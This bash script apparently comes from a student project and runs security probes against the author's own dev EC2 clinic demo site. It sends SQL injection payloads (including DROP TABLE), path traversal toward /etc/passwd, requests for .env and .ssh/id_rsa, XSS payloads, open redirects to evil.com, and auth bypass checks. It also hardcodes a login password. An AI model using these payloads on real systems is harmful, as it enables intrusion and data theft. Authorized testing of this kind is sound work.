#!/bin/bash
# Pillar A: live security probes against dev EC2 (read-only / non-destructive).
#
# Categories: header inspection, SQL injection, path traversal, sensitive
# file enumeration, XSS reflection, open redirect, HTTP method tampering,
# auth bypass, session fixation, login throttle, TLS, info disclosure.
set -e
EC2="https://13.222.3.49"
DEST="/Users/josiahzacharias/Library/Mobile Documents/com~apple~CloudDocs/School/UWB/CSS 595 (Final Project)/Final Paper/RDS Data/data/pillar_a"

echo "1. HTTP security headers..."
{
  echo "endpoint,header,value"
  for ep in "/" "/public/httpdocs/about/NearVisionInstitute/Company/signin.php" "/api/v1/health" "/demo-clinician-dashboard.php"; do
    headers=$(curl -ksI "$EC2$ep" 2>/dev/null | tr -d '\r')
    while IFS= read -r line; do
      if [[ "$line" =~ ^[A-Za-z][A-Za-z0-9-]*: ]]; then
        name="${line%%:*}"
        value="${line#*: }"
        value="${value//,/;}"
        echo "$ep,$name,$value"
      fi
    done <<< "$headers"
  done
} > "$DEST/pillar_a_headers.csv"
echo "   -> pillar_a_headers.csv"

echo "2. SQL injection probes..."
{
  echo "category,payload,http_code,result,redirect_url"
  PAYLOADS=(
    "' OR '1'='1"
    "admin' --"
    "'; DROP TABLE Accounts; --"
    "' UNION SELECT 1,2,3,4 --"
    "%27%20OR%201=1--"
    "' OR SLEEP(2) --"
    "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a) --"
  )
  for payload in "${PAYLOADS[@]}"; do
    body="username=$(echo "$payload" | tr ' ' '+')&password=test"
    out=$(curl -ksL -d "$body" -o /dev/null -w "%{http_code}|%{url_effective}|%{time_total}" \
                "$EC2/login/functions/login_sb.php" 2>/dev/null)
    code="${out%%|*}"; rest="${out#*|}"
    url="${rest%%|*}"; total="${rest##*|}"
    if echo "$url" | grep -q "error=1"; then
      result="rejected"
    else
      result="suspicious"
    fi
    echo "sqli,\"$payload\",$code,$result,\"$url\""
  done
} > "$DEST/pillar_a_sqli_probes.csv"
echo "   -> pillar_a_sqli_probes.csv"

echo "3. Path traversal probes..."
{
  echo "category,payload,http_code,size,exposed"
  PATHS=(
    "/?file=../../../etc/passwd"
    "/?page=../../../../etc/passwd"
    "/Professional/prof_home1.php?id=../../../etc/passwd"
    "/?path=../../etc/hosts"
    "/api/v1/students/../../../etc/passwd"
    "/..%2F..%2F..%2Fetc%2Fpasswd"
  )
  for p in "${PATHS[@]}"; do
    out=$(curl -ks -o /tmp/traversal_resp.txt -w "%{http_code}|%{size_download}" "$EC2$p" 2>/dev/null)
    code="${out%%|*}"; size="${out##*|}"
    exposed="no"
    if grep -q "root:x:" /tmp/traversal_resp.txt 2>/dev/null; then
      exposed="YES_PASSWD_LEAK"
    elif grep -q "127.0.0.1" /tmp/traversal_resp.txt 2>/dev/null && [[ "$size" -lt 5000 ]]; then
      exposed="YES_HOSTS_LEAK"
    fi
    echo "path_traversal,\"$p\",$code,$size,$exposed"
  done
} > "$DEST/pillar_a_path_traversal.csv"
echo "   -> pillar_a_path_traversal.csv"

echo "4. Sensitive file enumeration..."
{
  echo "category,path,http_code,size,exposed"
  FILES=(
    "/.env"
    "/.git/config"
    "/.git/HEAD"
    "/composer.json"
    "/composer.lock"
    "/package.json"
    "/phpinfo.php"
    "/info.php"
    "/server-status"
    "/server-info"
    "/wp-config.php"
    "/config.php"
    "/db_connect.php"
    "/DB/db_connect.php"
    "/.htaccess"
    "/.DS_Store"
    "/backup.sql"
    "/.bash_history"
    "/.ssh/id_rsa"
    "/api/v1/.env"
  )
  for p in "${FILES[@]}"; do
    out=$(curl -ks -o /tmp/sensitive_resp.txt -w "%{http_code}|%{size_download}" "$EC2$p" 2>/dev/null)
    code="${out%%|*}"; size="${out##*|}"
    exposed="no"
    if [[ "$code" == "200" && "$size" -gt 0 ]]; then
      first=$(head -c 200 /tmp/sensitive_resp.txt 2>/dev/null)
      if echo "$first" | grep -qiE "DB_HOST|DB_USER|DB_PASS|password|api_key|secret|<\\?php define" ; then
        exposed="YES_CRED_LEAK"
      elif echo "$first" | grep -qE "ref:|repo:|\\[core\\]|\\[remote" ; then
        exposed="YES_GIT_LEAK"
      elif [[ "$size" -lt 200 ]]; then
        exposed="empty_or_404_page"
      else
        exposed="200_but_unclear"
      fi
    fi
    echo "sensitive_file,\"$p\",$code,$size,$exposed"
  done
} > "$DEST/pillar_a_sensitive_files.csv"
echo "   -> pillar_a_sensitive_files.csv"

echo "5. XSS reflection probes..."
{
  echo "category,payload,reflected_unescaped"
  PAYLOADS=(
    '<script>alert(1)</script>'
    '"><script>alert(1)</script>'
    "'><svg/onload=alert(1)>"
    '<img src=x onerror=alert(1)>'
  )
  for payload in "${PAYLOADS[@]}"; do
    body="username=$(echo "$payload" | tr ' ' '+')&password=test"
    response=$(curl -ksL -d "$body" "$EC2/login/functions/login_sb.php" 2>/dev/null)
    reflected="no"
    if echo "$response" | grep -qF "$payload"; then
      reflected="YES_REFLECTED"
    fi
    p_csv="${payload//\"/\"\"}"
    echo "xss,\"$p_csv\",$reflected"
  done
} > "$DEST/pillar_a_xss_probes.csv"
echo "   -> pillar_a_xss_probes.csv"

echo "6. Open redirect probes..."
{
  echo "category,payload,http_code,redirect_target,opened"
  REDIRECTS=(
    "/?redirect=https://evil.com"
    "/?next=https://evil.com"
    "/?return_to=https://evil.com"
    "/?url=https://evil.com"
  )
  for p in "${REDIRECTS[@]}"; do
    out=$(curl -ks -o /dev/null -w "%{http_code}|%{redirect_url}" "$EC2$p")
    code="${out%%|*}"; redir="${out##*|}"
    opened="no"
    [[ "$redir" == *"evil.com"* ]] && opened="YES"
    echo "open_redirect,\"$p\",$code,\"$redir\",$opened"
  done
} > "$DEST/pillar_a_open_redirect.csv"
echo "   -> pillar_a_open_redirect.csv"

echo "7. HTTP method probes..."
{
  echo "method,endpoint,http_code,allow_header"
  for m in OPTIONS TRACE PUT DELETE; do
    for ep in "/" "/api/v1/health"; do
      out=$(curl -ks -X "$m" -o /dev/null -D /tmp/method_h.txt -w "%{http_code}" "$EC2$ep")
      allow=$(grep -i "^allow:" /tmp/method_h.txt | head -1 | sed 's/[\r\n]//g; s/,/;/g')
      echo "$m,$ep,$out,\"$allow\""
    done
  done
} > "$DEST/pillar_a_http_methods.csv"
echo "   -> pillar_a_http_methods.csv"

echo "8. Auth bypass probes..."
{
  echo "endpoint,http_code,redirect_url,protected"
  PROTECTED=(
    "/Professional/prof_home1.php"
    "/Professional/prof_profile1.php?id=1"
    "/MAPs/maps_outline.php"
    "/MAPs/maps_toolbox.php"
    "/api/v1/students"
    "/api/v1/dashboard/messages"
    "/api/v1/study/clinicians"
    "/api/v1/triage"
    "/Accounts/accounts_member.php"
    "/Billing/billing_profile1.php"
  )
  for ep in "${PROTECTED[@]}"; do
    out=$(curl -ks -o /tmp/auth_resp.txt -w "%{http_code}|%{redirect_url}" "$EC2$ep")
    code="${out%%|*}"; redir="${out##*|}"
    protected="UNKNOWN"
    if [[ "$code" == "401" ]] || echo "$redir" | grep -qiE "signin|login"; then
      protected="YES_redirect_or_401"
    elif grep -qiE 'name="username"|signin.php|loginhide|please log in' /tmp/auth_resp.txt 2>/dev/null; then
      protected="YES_login_form_returned"
    elif [[ "$code" == "200" ]]; then
      protected="POSSIBLE_LEAK"
    fi
    echo "$ep,$code,\"$redir\",$protected"
  done
} > "$DEST/pillar_a_auth_bypass.csv"
echo "   -> pillar_a_auth_bypass.csv"

echo "9. Session fixation check..."
rm -f /tmp/cookies_pre.txt /tmp/cookies_post.txt
curl -ksL -c /tmp/cookies_pre.txt "$EC2/public/httpdocs/about/NearVisionInstitute/Company/signin.php" -o /dev/null
PRE_SID=$(grep PHPSESSID /tmp/cookies_pre.txt | awk '{print $7}' | head -1)
cp /tmp/cookies_pre.txt /tmp/cookies_post.txt
curl -ksL -c /tmp/cookies_post.txt -b /tmp/cookies_post.txt \
  -d "username=josiahzacharias@gmail.com&password=Dev2025!" \
  "$EC2/login/functions/login_sb.php" -o /dev/null
POST_SID=$(grep PHPSESSID /tmp/cookies_post.txt | awk '{print $7}' | head -1)
{
  echo "stage,session_id"
  echo "pre_login,$PRE_SID"
  echo "post_login,$POST_SID"
} > "$DEST/pillar_a_session_rotation.csv"
if [[ "$PRE_SID" != "$POST_SID" ]]; then
  echo "   ✓ Session rotated on login"
else
  echo "   ✗ Session did NOT rotate (vulnerability)"
fi

echo "10. Login throttle observation (10 sequential failed attempts)..."
{
  echo "attempt,http_code,response_time_ms,redirect_url"
  for i in $(seq 1 10); do
    out=$(curl -ksL -d "username=nonexistentuser&password=wrong" -o /dev/null \
                -w "%{http_code}|%{time_total}|%{url_effective}" \
                "$EC2/login/functions/login_sb.php")
    code="${out%%|*}"; rest="${out#*|}"
    total="${rest%%|*}"; url="${rest##*|}"
    total_ms=$(awk "BEGIN {printf \"%.0f\", $total * 1000}")
    echo "$i,$code,$total_ms,\"$url\""
    sleep 0.1
  done
} > "$DEST/pillar_a_throttle.csv"
echo "   -> pillar_a_throttle.csv"

echo "11. TLS info..."
{
  echo 'field,value'
  out=$(echo | openssl s_client -connect 13.222.3.49:443 -servername eyeseeclinicdemo.com 2>/dev/null \
        | openssl x509 -noout -dates -subject -issuer 2>/dev/null)
  while IFS='=' read -r key value; do
    if [[ -n "$key" ]]; then
      value="${value//\"/\"\"}"
      echo "$key,\"$value\""
    fi
  done <<< "$out"
  proto=$(echo | openssl s_client -connect 13.222.3.49:443 -servername eyeseeclinicdemo.com 2>/dev/null \
          | grep -m1 "Protocol  :" | sed 's/.*: *//')
  cipher=$(echo | openssl s_client -connect 13.222.3.49:443 -servername eyeseeclinicdemo.com 2>/dev/null \
           | grep -m1 "Cipher    :" | sed 's/.*: *//')
  [[ -n "$proto" ]] && echo "Protocol,\"$proto\""
  [[ -n "$cipher" ]] && echo "Cipher,\"$cipher\""
} > "$DEST/pillar_a_tls.csv"
echo "   -> pillar_a_tls.csv"

echo "12. Server banner..."
curl -ksI "$EC2/api/v1/health" 2>/dev/null | grep -iE "^(server|x-powered-by):" > "$DEST/pillar_a_disclosure.txt" || echo "(none)" > "$DEST/pillar_a_disclosure.txt"

echo
echo "Done."
